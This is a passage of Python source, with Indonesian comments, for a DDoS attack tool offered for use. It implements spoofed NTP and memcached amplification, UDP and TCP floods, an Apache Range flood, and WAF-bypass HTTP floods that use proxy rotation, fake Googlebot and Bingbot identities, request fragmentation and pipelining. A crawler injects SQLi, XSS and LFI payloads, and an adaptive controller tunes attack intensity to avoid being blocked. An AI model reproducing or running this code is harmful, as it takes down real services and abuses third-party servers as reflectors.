                sport = random.randint(1024, 65535)
                target_port = self.get_target_port("l4")
                udp_len = 8 + len(payload)
                udp_header = struct.pack('!HHHH', sport, target_port, udp_len, 0)
                
                s.sendto(ip_header + udp_header + payload, (dest_ip, 0))
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["udp_fragmentation_flood"] += 1
                # print(f"UDP Fragmentation Flood Error: {e}") # Debug
                # print(f"UDP Fragmentation Flood Error: {e}") # Debug

    def ntp_amplification(self):
        """NTP Amplification Attack"""
        if not SCAPY_AVAILABLE:
            return
        # Daftar server NTP publik (sebaiknya gunakan list yang lebih besar)
        ntp_servers = ["time.google.com", "time.cloudflare.com", "pool.ntp.org", "time.nist.gov"]
        
        # Load custom NTP servers if file exists
        if os.path.exists("ntp.txt"):
            try:
                with open("ntp.txt", "r") as f:
                    custom_ntp = [line.strip() for line in f if line.strip()]
                if custom_ntp:
                    print(f"{Fore.GREEN}[+] Loaded {len(custom_ntp)} custom NTP servers from ntp.txt")
                    ntp_servers = custom_ntp
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to load ntp.txt: {e}")

        resolved_servers = []
        for s in ntp_servers:
            try: resolved_servers.append(socket.gethostbyname(s))
            except: pass
            
        if not resolved_servers: return

        # Payload Monlist command
        payload = b'\x17\x00\x03\x2a' + b'\x00' * 44

        while self.running:
            try:
                self.new_dangerous_function()
                server_ip = random.choice(resolved_servers)
                # Spoof source IP as target IP so response goes to target
                packet = IP(src=self.get_target_ip(), dst=server_ip)/UDP(sport=random.randint(1024, 65535), dport=123)/payload
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["ntp_amplification"] += 1
                # print(f"NTP Amplification Error: {e}") # Debug
                # print(f"NTP Amplification Error: {e}") # Debug

    def memcached_amplification(self):
        """Memcached Amplification (UDP 11211)"""
        if not SCAPY_AVAILABLE:
            return
        
        memcached_servers = []
        # Load custom Memcached servers if file exists
        if os.path.exists("memcached.txt"):
            try:
                with open("memcached.txt", "r") as f:
                    memcached_servers = [line.strip() for line in f if line.strip()]
                if memcached_servers:
                    print(f"{Fore.GREEN}[+] Loaded {len(memcached_servers)} custom Memcached servers from memcached.txt")
            except Exception as e:
                print(f"{Fore.RED}[!] Failed to load memcached.txt: {e}")

        # Payload 'stats' untuk memicu respons besar
        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        while self.running:
            try:
                self.new_dangerous_function()
                if memcached_servers:
                    reflector_ip = random.choice(memcached_servers)
                else:
                    # Menggunakan IP acak sebagai reflector (Spray & Pray) jika tidak ada list
                    reflector_ip = self.generate_smart_ip()
                
                # Spoof Source IP = Target IP (salah satu dari pool)
                packet = IP(src=self.get_target_ip(), dst=reflector_ip)/UDP(sport=random.randint(1024, 65535), dport=11211)/payload
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except Exception as e:
                self.global_learning_data["errors"]["memcached_amplification"] += 1
                # print(f"Memcached Amplification Error: {e}") # Debug

    def range_flood(self):
        """HTTP Range Flood (Apache Killer) - Causes high CPU usage"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    current_port = self.get_target_port("l7") # Use smart port selection
                    
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{self.get_smart_path()}"
                    
                    proxy = self.get_proxy()
                    
                    headers = self.get_rotated_headers()
                    headers['X-Forwarded-For'] = self.generate_smart_ip()
                    headers['Range'] = 'bytes=0-' + ','.join([str(i) for i in range(1, 2000)]) # Malicious Range header
                    
                    start_t = time.time()
                    r = s.get(url, headers=headers, proxies=proxy, timeout=3, verify=False)
                    lat = time.time() - start_t
                    self.stats["requests"] += 1

                    # Feed data back to AI (Non-blocking analysis)
                    if random.random() < 0.1: # Sample 10% requests to save CPU
                        self.ai.analyze_response(url, r.status_code, dict(r.headers), 0, lat)
                    if self.dynamic_mode: break
                except Exception as e:
                    self.global_learning_data["errors"]["range_flood"] += 1
                    # print(f"Range Flood Error: {e}") # Debug

    def tcp_null_flood(self):
        """TCP Null Flood (No Flags)"""
        if not SCAPY_AVAILABLE:
            return
        while self.running:
            try:
                self.new_dangerous_function()
                src_ip = self.generate_smart_ip()
                target_port = self.get_target_port("l4") # Use smart port selection
                packet = IP(src=src_ip, dst=self.get_target_ip())/TCP(sport=random.randint(1024,65535), dport=target_port, flags="")
                send(packet, verbose=0)
                self.stats["packets"] += 1
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["tcp_null_flood"] += 1
                # print(f"TCP Null Flood Error: {e}") # Debug

    def http_cookie_flood(self):
        """HTTP Cookie Flood (Cache Bypass)"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    # Generate random cookies to bypass cache
                    cookies = {f"sess_{random.randint(1,1000)}": os.urandom(8).hex() for _ in range(5)}
                    headers = {'User-Agent': self.get_user_agent()}
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    s.get(f"{scheme}://{self.target}:{current_port}/", cookies=cookies, headers=headers, proxies=proxy, timeout=2)
                    self.stats["requests"] += 1
                    if self.dynamic_mode: break
                except:
                    self.global_learning_data["errors"]["http_cookie_flood"] += 1
                    # print(f"HTTP Cookie Flood Error: {e}") # Debug

    def cloudflare_flood(self):
        """Cloudflare Bypass Flood (Requires cloudscraper)"""
        try:
            import cloudscraper
            # Konfigurasi agar terlihat seperti Chrome di Windows
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True}
            )
        except ImportError:
            print(f"{Fore.RED}[!] Modul 'cloudscraper' tidak ditemukan. Install dengan: pip install cloudscraper")
            return

        # Daftar profil browser untuk menyamar
        browser_profiles = [
            {'browser': 'chrome', 'platform': 'windows', 'desktop': True},
            {'browser': 'firefox', 'platform': 'windows', 'desktop': True},
            {'browser': 'chrome', 'platform': 'linux', 'desktop': True},
            {'browser': 'firefox', 'platform': 'mac', 'desktop': True}
        ]

        scheme = "https" if self.port == 443 else "http"

        while self.running:
            try:
                self.new_dangerous_function()
                proxy = self.get_proxy()
                
                # Buat sesi baru dengan profil browser acak (Rotasi Fingerprint)
                scraper = cloudscraper.create_scraper(browser=random.choice(browser_profiles))
                
                # Gunakan sesi ini untuk beberapa request sebelum ganti identitas
                for _ in range(random.randint(5, 20)):
                    if not self.running: break
                    current_port = self.get_target_port("l7") # Use smart port selection
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}/"
                    
                    start_t = time.time()
                    resp = scraper.get(url, proxies=proxy, timeout=5)
                    lat = time.time() - start_t
                    
                    if resp.status_code == 200: # Only count successful bypasses
                        self.stats["requests"] += 1
                        self.global_learning_data["response_times"].append(lat)
                        self.global_learning_data["status_codes"][resp.status_code] += 1
                        self.ai.analyze_response(url, resp.status_code, dict(resp.headers), len(resp.content), lat)
                    elif resp.status_code in [403, 503]:
                        
                        break
                if self.dynamic_mode: break
            except:
                pass

    def bypass_waf_flood(self):
        """WAF Bypass Flood - Menggunakan teknik obfuscation, fake bot, dan header manipulasi"""
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    
                    # Path Obfuscation Techniques
                    original_path = self.get_smart_path()
                    path = original_path
                    obfuscation_type = random.randint(0, 3)
                    
                    if obfuscation_type == 0:
                        path = path.replace("/", "/./") # /login -> /./login
                    elif obfuscation_type == 1:
                        path = path.replace("/", "//") # /login -> //login
                    elif obfuscation_type == 2:
                        # URL Encoding random characters
                        chars = list(path)
                        if len(chars) > 1:
                            idx = random.randint(1, len(chars)-1)
                            if chars[idx].isalnum():
                                chars[idx] = f"%{ord(chars[idx]):02x}"
                            path = "".join(chars)
                    
                    url = f"{scheme}://{self.target}:{current_port}{path}"
                    
                    # Fake Googlebot / Bingbot Headers
                    bot_type = random.choice(['google', 'bing'])
                    if bot_type == 'google':
                        ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
                        ip_range = f"66.249.{random.randint(64, 95)}.{random.randint(0, 255)}"
                    else:
                        ua = "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
                        ip_range = f"157.55.{random.randint(32, 39)}.{random.randint(0, 255)}"

                    headers = {
                        'User-Agent': ua,
                        'Accept': '*/*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive',
                        'X-Forwarded-For': ip_range,
                        'Client-IP': ip_range,
                        'X-Real-IP': ip_range,
                        # Bypass headers
                        'X-Original-URL': original_path,
                        'X-Rewrite-URL': original_path,
                        'X-Custom-IP-Authorization': ip_range
                    }
                    
                    start_t = time.time()
                    r = s.get(url, headers=headers, proxies=proxy, timeout=3, verify=False)
                    lat = time.time() - start_t
                    self.stats["requests"] += 1
                    
                    if random.random() < 0.1:
                        self.ai.analyze_response(url, r.status_code, dict(r.headers), 0, lat)
                    if self.dynamic_mode: break
                except:
                    self.global_learning_data["errors"]["bypass_waf_flood"] += 1

    def advanced_bypass_flood(self):
        """Advanced WAF Bypass - Header Casing, Junk Headers, HPP, Order Randomization"""
        while self.running:
            s = None
            try:
                self.new_dangerous_function()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                target_ip = self.get_target_ip()
                port = self.get_target_port("l7")
                
                # Proxy handling
                proxy = self.get_proxy()
                if proxy:
                    try:
                        proxy_ip, proxy_port, user, password = self.parse_proxy(proxy['http'])
                        s.connect((proxy_ip, int(proxy_port)))
                        auth_header = ""
                        if user and password:
                            cred = base64.b64encode(f"{user}:{password}".encode()).decode()
                            auth_header = f"Proxy-Authorization: Basic {cred}\r\n"
                        s.send(f"CONNECT {self.target}:{port} HTTP/1.1\r\nHost: {self.target}:{port}\r\n{auth_header}\r\n".encode())
                        if b"200" not in s.recv(1024):
                            s.close()
                            continue
                    except:
                        s.close()
                        continue
                else:
                    s.connect((target_ip, port))
                
                if port == 443:
                    s = self.ssl_context.wrap_socket(s, server_hostname=self.target)
                
                # 1. Randomize Header Casing
                def random_case(s):
                    return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in s)

                path = self.get_smart_path()
                
                # 2. HTTP Parameter Pollution (HPP)
                if "?" in path:
                    path += f"&{random_case('bypass')}={random.randint(1,1000)}"
                else:
                    path += f"?{random_case('bypass')}={random.randint(1,1000)}"

                # 3. Construct Raw Request
                method = random.choice(["GET", "POST", "HEAD"])
                req = f"{method} {path} HTTP/1.1\r\n"
                
                # 4. Junk Headers to overflow inspection buffer
                junk_headers = []
                for _ in range(random.randint(5, 15)):
                    h_name = f"X-{random_case(self.generate_payload(4, 8).hex())}"
                    h_val = self.generate_payload(10, 50).hex()
                    junk_headers.append(f"{h_name}: {h_val}")

                headers_list = [
                    f"{random_case('Host')}: {self.target}",
                    f"{random_case('User-Agent')}: {self.get_user_agent()}",
                    f"{random_case('Accept')}: */*",
                    f"{random_case('Connection')}: keep-alive",
                ] + junk_headers
                
                random.shuffle(headers_list) # 5. Randomize Header Order
                
                payload_str = req + "\r\n".join(headers_list) + "\r\n"
                
                if method == "POST":
                    body = f"data={self.generate_payload(10, 50).hex()}"
                    payload_str += f"{random_case('Content-Length')}: {len(body)}\r\n\r\n{body}"
                else:
                    payload_str += "\r\n"

                s.send(payload_str.encode())
                
                # Read response to keep connection alive if possible
                try:
                    s.recv(1024)
                except: pass
                
                self.stats["requests"] += 1
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["advanced_bypass_flood"] += 1
                if s:
                    try: s.close()
                    except: pass

    def recursive_flood(self):
        """Recursive GET Flood - Crawl & Flood (Auto-Discovery)"""
        known_paths = set(["/"])
        
        with self._get_session() as s:
            while self.running:
                try:
                    self.new_dangerous_function()
                    proxy = self.get_proxy()
                    
                    # Pick a path to attack (Randomly from discovered paths)
                    path = random.choice(list(known_paths)) if known_paths else "/"
                        
                    current_port = self.get_target_port("l7")
                    scheme = "https" if current_port == 443 else "http"
                    url = f"{scheme}://{self.target}:{current_port}{path}"

                    headers = self.get_rotated_headers()
                    headers['X-Forwarded-For'] = self.generate_smart_ip()
                    headers['Referer'] = f"{scheme}://{self.target}:{current_port}/"

                    # Request
                    start_t = time.time()
                    r = s.get(url, headers=headers, proxies=proxy, timeout=3, verify=False)
                    lat = time.time() - start_t
                    self.stats["requests"] += 1
                    
                    # Feed data back to AI
                    self.global_learning_data["response_times"].append(lat)
                    self.global_learning_data["status_codes"][r.status_code] += 1
                    self.ai.analyze_response(url, r.status_code, dict(r.headers), len(r.content), lat)

                    # Crawl logic (only if text/html and successful)
                    if r.status_code == 200 and 'text/html' in r.headers.get('Content-Type', ''):
                        # print(f"{Fore.BLUE}[CRAWL] Discovered links from {url}") # Debug
                        content = r.text
                        new_links = set()
                        
                        if BS4_AVAILABLE:
                            soup = BeautifulSoup(content, 'html.parser')
                            for a in soup.find_all('a', href=True):
                                href = a['href']
                                # Filter internal links
                                if href.startswith('/') or self.target in href:
                                    if href.startswith('http') and self.target not in href: continue
                                    # Normalize path
                                    if self.target in href:
                                        try: href = href.split(self.target)[1]
                                        except: continue
                                    if not href.startswith('/'): href = '/' + href
                                    new_links.add(href.split('#')[0].split('?')[0])
                        
                        # Add new paths to attack list (limit to prevent memory overflow)
                        if new_links and len(known_paths) < 5000:
                            known_paths.update(new_links)
                            # Optional: print(f"Discovered {len(new_links)} new paths")
                            
                    if self.dynamic_mode: break
                except Exception:
                    self.global_learning_data["errors"]["recursive_flood"] += 1 # Record error
                    # print(f"Recursive Flood Error: {e}") # Debug
                    # print(f"Recursive Flood Error: {e}") # Debug

    def random_subdomain_flood(self):
        """Random Subdomain Flood - Stress DNS & VHost"""
        while self.running:
            try:
                self.new_dangerous_function()
                sub = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5, 15)))
                host_header = f"{sub}.{self.target}"
                current_port = self.get_target_port("l7")
                scheme = "https" if current_port == 443 else "http"
                url = f"{scheme}://{self.target}:{current_port}/"
                headers = {'Host': host_header, 'User-Agent': self.get_user_agent()}
                proxy = self.get_proxy()
                requests.get(url, headers=headers, proxies=proxy, timeout=2)
                self.stats["requests"] += 1
                if self.dynamic_mode: break
            except Exception as e:
                self.global_learning_data["errors"]["random_subdomain_flood"] += 1

    def quantum_recursive_flood(self):
        """Quantum Recursive Flood (Async High-Speed)"""
        if not AIOHTTP_AVAILABLE:
            return

        async def _worker():
            # Optimized connector (reused across requests in this worker)
            # Use a single connector per worker for efficiency
            connector = aiohttp.TCPConnector(ssl=False, limit=0, ttl_dns_cache=300) 
            async with aiohttp.ClientSession(connector=connector) as session:
                queue = deque([self.get_smart_path()])
                visited = set()
                
                while self.running:
                    try:
                        if not queue: queue.append(self.get_smart_path())
                        path = queue.popleft()
                        
                        # Avoid cycles
                        if path in visited and len(visited) > 5000: # Increased limit for more thorough crawling
                            visited.clear()
                        visited.add(path)

                        current_port = self.get_target_port("l7")
                        scheme = "https" if current_port == 443 else "http"
                        base_url = f"{scheme}://{self.target}:{current_port}"
                        target_url = f"{base_url}{path}"
                        
                        # 1. AI Analysis & Payload Generation
                        # Select random pattern
                        pattern = random.choice(list(PIYOAIAnalyzer.AttackPattern))
                        ai_payload = self.ai.generate_intelligent_payload(target_url, pattern)
                        
                        # Merge params
                        params = ai_payload.get("params", {})
                        # Inject c.py payloads occasionally
                        if random.random() < 0.3: # 30% chance to inject exploit payload (SQLi/XSS/LFI)
                            vuln_type = random.choice(['sql', 'xss', 'lfi'])
                            if vuln_type == 'sql': payload = random.choice(self.sql_payloads)
                            elif vuln_type == 'xss': payload = random.choice(self.xss_payloads)
                            else: payload = random.choice(self.lfi_payloads)
                            params[f"v_{random.randint(1,100)}"] = payload

                        headers = {
                            'User-Agent': self.get_user_agent(), # Use rotated UA
                            **ai_payload.get("headers", {})
                        }

                        # Perform the request
                        # self.new_dangerous_function() # Not needed for async workers
                        start_time = time.time()
                        
                        # Handle different session types
                        if CURL_CFFI_AVAILABLE:
                            resp = await session.get(target_url, params=params, headers=headers, timeout=5)
                            status = resp.status_code
                            text_content = resp.text
                        else:
                            resp = await session.get(target_url, params=params, headers=headers, timeout=5)
                            status = resp.status
                            text_content = await resp.text(errors='ignore')

                        latency = time.time() - start_time
                        self.stats["requests"] += 1
                        
                        # AI Feedback Loop
                        self.global_learning_data["response_times"].append(latency)
                        self.global_learning_data["status_codes"][status] += 1
                        body_bytes = 0

                        if status == 200:
                            try:
                                text = text_content
                                body_bytes = len(text)
                            except: text = ""
                            
                            # Intelligent Extraction (from m.py/c.py)
                            patterns = [r'href=["\']([^"\']+)["\']', r'src=["\']([^"\']+)["\']', r'action=["\']([^"\']+)["\']']
                            for p in patterns:
                                for match in re.finditer(p, text):
                                    new_path = match.group(1)
                                    if new_path.startswith('/'):
                                        queue.append(new_path)
                        
                        # Feed data back to AI
                        self.ai.analyze_response(target_url, status, dict(resp.headers), body_bytes, latency, text_content.encode() if isinstance(text_content, str) else text_content)
                            
                        if self.dynamic_mode: break
                    except Exception as e:
                        self.global_learning_data["errors"]["quantum_recursive_flood"] += 1
                        await asyncio.sleep(0.1)

        # Jalankan loop async
        asyncio.run(_worker())

    def fragmented_flood(self):
        """HTTP Fragmentation Flood - Bypass WAF by splitting packets"""
        while self.running:
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                target_ip = self.get_target_ip()
                port = self.get_target_port("l7")
                
                if port == 443:
                    s.connect((target_ip, port))
                    s = self.ssl_context.wrap_socket(s, server_hostname=self.target)
                else:
                    s.connect((target_ip, port))
                
                path = self.get_smart_path()
                headers = [
                    f"GET {path} HTTP/1.1", # Method line
                    f"Host: {self.target}",
                    f"User-Agent: {self.get_user_agent()}",
                    "Accept: */*",
                    "Connection: keep-alive",
                    "\r\n"
                ]
                # Smart Fragmentation: Split headers randomly to evade WAF regex
                # Join with \r\n but keep them as a single byte stream to split
                full_req = "\r\n".join(headers)
                payload = full_req.encode()
                
                # Send in random chunks with tiny delays (WAF Evasion)
                # Split critical keywords like "User-Agent" or "Host"
                i = 0
                while i < len(payload):
                    if not self.running: break
                    # Random chunk size 1-3 bytes for maximum fragmentation
                    chunk_size = random.randint(1, 3)
                    s.send(payload[i:i+chunk_size])
                    i += chunk_size
                    # Micro-sleep to force packet separation
                    time.sleep(random.uniform(0.001, 0.05))
                
                self.stats["requests"] += 1
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["fragmented_flood"] += 1 # Record error
                # print(f"Fragmented Flood Error: {e}") # Debug
                if s:
                    try: s.close()
                    except: pass

    def pipeline_flood(self):
        """HTTP Pipelining Flood - High Throughput"""
        while self.running:
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                
                target_ip = self.get_target_ip()
                port = self.get_target_port("l7") # Gunakan smart port selection
                
                if port == 443:
                    s.connect((target_ip, port))
                    s = self.ssl_context.wrap_socket(s, server_hostname=self.target)
                else:
                    s.connect((target_ip, port))
                
                path = self.get_smart_path()
                req = f"GET {path} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {self.get_user_agent()}\r\nConnection: keep-alive\r\n\r\n"
                payload = (req * 10).encode() # Pipeline 10 requests at once
                
                s.send(payload)
                self.stats["requests"] += 10
                s.close()
                if self.dynamic_mode: break
            except:
                self.global_learning_data["errors"]["pipeline_flood"] += 1 # Record error
                # print(f"Pipeline Flood Error: {e}") # Debug
                if s:
                    try: s.close()
                    except: pass

    def stats_printer(self):
        """Display real-time stats"""
        prev_packets = 0
        prev_requests = 0
        print(f"{Fore.YELLOW}[*] Monitoring started... (Press Ctrl+C to stop){Fore.RESET}")
        
        while self.running:
            time.sleep(1)
            curr_packets = self.stats["packets"]
            curr_requests = self.stats["requests"]
            curr_conns = self.stats["connections"]
            
            pps = curr_packets - prev_packets
            rps = curr_requests - prev_requests
            
            prev_packets = curr_packets
            prev_requests = curr_requests
            
            proxy_count = len(self.proxies)
            proxy_idx = self.proxy_index % proxy_count if proxy_count > 0 else 0
            
            sys.stdout.write(
                f"\r{Fore.CYAN}[🚀 RUNNING] "
                f"{Fore.WHITE}Pkts: {Fore.GREEN}{curr_packets:,} {Fore.YELLOW}({pps}/s){Fore.WHITE} | "
                f"Reqs: {Fore.GREEN}{curr_requests:,} {Fore.YELLOW}({rps}/s){Fore.WHITE} | "
                f"Conns: {Fore.MAGENTA}{curr_conns}{Fore.WHITE} | "
                f"Proxy: {Fore.BLUE}{proxy_idx}/{proxy_count}{Fore.RESET}   "
            )
            sys.stdout.flush()

    def ai_monitor(self):
        """Display AI insights periodically"""
        while self.running:
            time.sleep(5) # Update every 5 seconds
            if not self.running: break
            
            # Get insights from the global learning data
            insights = self.ai.get_insights(self.global_learning_data)
            if "N/A" not in insights:
                print(f"\n{Fore.MAGENTA}[🧠 AI BRAIN] {insights}{Fore.RESET}")

    def stop(self):
        """Hentikan serangan"""
        self.running = False
        print(f"\n{Fore.RED}[!] Waktu habis! Menghentikan serangan...{Fore.RESET}")

    def AI_Orchestrator(self):
        """AI-driven orchestrator to dynamically adjust attack weights"""
        phase = "LEARNING" # LEARNING -> PROBING -> ASSAULT -> CHAOS
        
        # PID Controller State
        kp, ki, kd = 0.5, 0.1, 0.2
        prev_error = 0
        integral = 0

        while self.running:
            time.sleep(5) # Adjust strategy every 5 seconds
            if not self.running: break

            # Snapshot and Reset Stats for Real-time Analysis
            status_counts = self.global_learning_data["status_codes"].copy()
            error_counts = self.global_learning_data["errors"].copy()
            # Reset stats to react to CURRENT conditions only
            self.global_learning_data["status_codes"].clear()
            self.global_learning_data["errors"].clear()

            total_requests = sum(status_counts.values())
            total_internal_errors = sum(error_counts.values())
            
            if total_requests == 0 and total_internal_errors == 0: continue

            # Analyze Metrics
            waf_blocks = sum(status_counts[k] for k in [403, 406, 429] if k in status_counts)
            server_errors = sum(status_counts[k] for k in status_counts if k >= 500)
            success_reqs = sum(status_counts[k] for k in status_counts if 200 <= k < 300)
            
            # --- PID Controller for Aggression Level ---
            # Target: Keep WAF blocks below 2% to maintain stealth/effectiveness
            block_rate = waf_blocks / total_requests if total_requests > 0 else 0
            target_rate = 0.02
            error = target_rate - block_rate
            
            integral = max(-5, min(5, integral + error)) # Anti-windup
            derivative = error - prev_error
            adjustment = (kp * error) + (ki * integral) + (kd * derivative)
            
            # Apply adjustment (Dynamic Aggression)
            self.aggression_level = max(0.1, min(50.0, self.aggression_level + adjustment))
            prev_error = error
            
            # HUD Panglima Perang
            defcon_color = {5: Fore.GREEN, 4: Fore.CYAN, 3: Fore.YELLOW, 2: Fore.RED, 1: Fore.RED + Style.BRIGHT}
            d_col = defcon_color.get(self.ai.defcon.value, Fore.WHITE)
            print(f"\n{d_col}[COMMANDER] DEFCON: {self.ai.defcon.name} | URANIUM: {self.ai.critical_mass:.1f}% | PHASE: {phase}{Fore.RESET}")
            print(f"{Fore.MAGENTA}[BATTLEFIELD] 2xx: {success_reqs} | WAF: {waf_blocks} | DOWN: {server_errors} | ERR: {total_internal_errors}{Fore.RESET}")

            # --- KILL CHAIN LOGIC (Focus Fire) ---
            if self.kill_chain_locked:
                # Jika terkunci, cek apakah masih efektif
                if waf_blocks > (total_requests * 0.3) or total_requests < 10:
                     print(f"{Fore.YELLOW}[🛡️ KILL CHAIN] Target adapted or connection lost. Disengaging lock.")
                     self.kill_chain_locked = False
                else:
                     print(f"{Fore.RED}[☠️ KILL CHAIN] Maintaining Lock. Pounding target weakness...")
                     continue # Skip weight adjustment, keep pounding

            # --- DOOMSDAY PROTOCOL (Last 20% of duration) ---
            if self.duration > 0:
                elapsed = time.time() - self.start_time
                if elapsed > (self.duration * 0.8):
                    print(f"{Fore.RED}[☢️ DOOMSDAY] Final Phase initiated. All limiters removed.")
                    self.aggression_level = 10.0
                    self.kill_chain_locked = False # Spray everything
                    # Force enable heavy vectors
                    self.attack_weights["l4"] += 0.5

            # --- MANHATTAN PROJECT (Nuclear Launch) ---
            if self.ai.critical_mass >= 100.0:
                print(f"{Fore.RED}{Style.BRIGHT}[☢️ NUCLEAR] CRITICAL MASS REACHED. INITIATING FISSION WAVE.{Style.RESET_ALL}")
                self.ai.defcon = PIYOAIAnalyzer.Defcon.NUCLEAR
                phase = "ANNIHILATION"
                self.nuclear_launch_code.set() # Authorize launch
                self.aggression_level = 50.0 # Maximum carnage
                # Reset uranium after discharge
                self.ai.critical_mass = 0.0
                time.sleep(5) # Biarkan ledakan terjadi
                self.nuclear_launch_code.clear() # Reset launch codes
                self.ai.defcon = PIYOAIAnalyzer.Defcon.SIEGE # Kembali ke pengepungan
                continue
            elif self.ai.critical_mass > 80.0:
                self.ai.defcon = PIYOAIAnalyzer.Defcon.SIEGE
            
            # --- PHOENIX PROTOCOL (Resilience) ---
            if waf_blocks > (total_requests * 0.6) and total_requests > 100:
                print(f"{Fore.CYAN}[🔥 PHOENIX] Critical Block Rate ({waf_blocks}/{total_requests}). Rebirthing...")
                self.proxy_index = random.randint(0, len(self.proxies)) if self.proxies else 0
                self.aggression_level = 1.0 # Reset aggression to fly under radar
                time.sleep(random.choice([2, 3, 5, 7])) # Prime number sleep to reset leaky buckets
                continue

            # --- GHOST PROTOCOL (Evasion) ---
            if waf_blocks > (total_requests * 0.4) and not self.kill_chain_locked:
                 print(f"{Fore.CYAN}[👻 GHOST] WAF Adaptation detected. Engaging Ghost Protocol (Low & Slow).")
                 self.aggression_level = 0.2 # Sangat lambat
                 # Reset weights to focus purely on stealth/slow attacks
                 self.attack_weights = {k: 0.01 for k in self.attack_weights}
                 self.attack_weights["slow"] = 1.0 # Prioritize Sockstress/Slowloris
                 self.attack_weights["l7"] = 0.5   # Legitimate looking requests only
                 time.sleep(1)
                 continue

            # --- AI Decision Logic ---
            if waf_blocks > (total_requests * 0.2):
                print(f"{Fore.YELLOW}[🛡️ AI] WAF Blocking detected! Shifting to Stealth/Bypass.")
                phase = "PROBING"
                self.ai.defcon = PIYOAIAnalyzer.Defcon.RECON
                self.attack_weights["cffi"] += 0.3
                self.attack_weights["bypass"] += 0.2
                self.attack_weights["l4"] *= 0.5
                # Aggression is now handled by PID, but we can force a drop if critical
                
                # Pulse Wave Logic: Jika diblokir keras, gunakan teknik denyut
                if waf_blocks > (total_requests * 0.5):
                    print(f"{Fore.MAGENTA}[🌊 AI] WAF Wall detected. Initiating PULSE WAVE pattern...")
                    phase = "CHAOS"
                    self.aggression_level = 0.1 # Istirahat
                    time.sleep(2)
                    self.aggression_level = 5.0 # Hantam Keras
            
            elif server_errors > (total_requests * 0.2) or total_internal_errors > 50:
                print(f"{Fore.RED}[💀 AI] Target is DOWN or struggling! Maintaining pressure.")
                phase = "ASSAULT"
                self.ai.defcon = PIYOAIAnalyzer.Defcon.ENGAGE
                self.attack_weights["l4"] += 0.1 # Volumetric to keep it down
                self.attack_weights["quantum"] += 0.1
            
            elif success_reqs > (total_requests * 0.9):
                print(f"{Fore.RED}[👹 TITAN] Target is weak! Engaging TITAN MODE (Max Throughput).")
                phase = "TITAN"
                self.ai.defcon = PIYOAIAnalyzer.Defcon.SIEGE
                # PID will naturally increase aggression, but we give it a boost
                # Fokus pada serangan aplikasi berat yang tembus
                self.attack_weights["cffi"] = 10 # Prefer HTTP/2 Multiplexing
                self.attack_weights["quantum"] = 10 # Prefer GraphQL/Recursive
                self.attack_weights["l7"] = 5
                self.attack_weights["l4"] = 1 # Kurangi L4 agar bandwidth fokus ke L7
                
                # Check for Lock Condition (High Success Rate)
                if success_reqs > (total_requests * 0.85) and total_requests > 50:
                     print(f"{Fore.RED}[☠️ KILL CHAIN] Weakness Found! Locking strategy for MAX DAMAGE.")
                     self.kill_chain_locked = True
                     self.aggression_level = 3.0

            # Normalize weights to sum to 1 (or a fixed value) for better distribution
            total_weight_sum = sum(self.attack_weights.values())
            if total_weight_sum > 0:
                for k in self.attack_weights:
                    self.attack_weights[k] /= total_weight_sum

            # Add some randomness to weights to explore new strategies
            for k in self.attack_weights:
                if k in self.attack_weights:
                    self.attack_weights[k] *= random.uniform(0.95, 1.05)
            
            # Ensure no weight drops to zero unless explicitly set
            for k in self.attack_weights:
                if self.attack_weights[k] < 0.001: self.attack_weights[k] = 0.001

            # Print top 3 weights for clarity
            top_weights = sorted(self.attack_weights.items(), key=lambda x: x[1], reverse=True)[:3]
            formatted_weights = ", ".join([f"{k}: {v:.2f}" for k, v in top_weights])
            print(f"{Fore.MAGENTA}[🧠 AI STRATEGY] Top: {{ {formatted_weights} }} | Aggression: {self.aggression_level:.2f}x{Fore.RESET}")

    def slow_websocket_flood(self):
        """Slow WebSocket Attack - Holds connections open with minimal data"""
        if not AIOHTTP_AVAILABLE:
            return

        async def _attack():
            while self.running:
                try:
                    proxy_dict = self.get_proxy()
                    proxy_url = proxy_dict['http'] if proxy_dict else None
                    
                    port = self.get_target_port("l7")
                    scheme = "wss" if port == 443 else "ws"
                    url = f"{scheme}://{self.target}:{port}{self.get_smart_path()}"
                    
                    headers = {'User-Agent': self.get_user_agent()}
                    
                    connector = aiohttp.TCPConnector(ssl=False, limit=0)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        try:
                            async with session.ws_connect(url, headers=headers, proxy=proxy_url, timeout=15) as ws:
                                self.stats["connections"] += 1
                                while self.running and not ws.closed:
                                    await ws.ping() # Kirim ping untuk menjaga koneksi
                                    await asyncio.sleep(random.uniform(10, 25)) # Tahan koneksi
                        except Exception:
                            if proxy_dict:
